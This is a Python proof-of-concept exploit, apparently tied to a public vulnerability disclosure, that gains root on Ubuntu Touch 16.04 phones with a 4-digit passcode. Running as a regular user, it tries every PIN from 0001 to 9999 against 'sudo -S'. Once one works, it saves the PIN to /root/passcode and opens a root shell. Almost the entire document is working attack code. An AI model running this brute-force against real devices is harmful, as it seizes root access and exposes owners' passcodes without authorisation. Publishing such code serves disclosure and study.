"""
Visit:
https://github.com/filipkarc/PoC-ubuntutouch-pin-privesc

Run as REGULAR user in Ubuntu Touch 16.04 with 4-digit passcode.

"""

import os
import sys

x = 1
while x <= 9999:
    password = (str(x).zfill(4))
    result = os.system("echo {} | sudo -Si".format(password.strip()))
    if result == "0" or result == 0:
        print("\n\n\n===> PIN is: " + password + "\n\n\n")
        print("whoami result:")
        os.system("echo \"whoami; echo " + password + " > /root/passcode; echo \"We saved passcode to the file /root/passcode:\"; cat /root/passcode\" | sudo su");
        print()
        os.system("sudo su");
        exit(0)
    x = x + 1

"""

What happened?
1. We found the 4-digit passcode via burtefore.
2. We obtained root.
3. We saved the content of 4-digit passcode in /root/passcode
4. We displayed the content of /root/passcode

"""
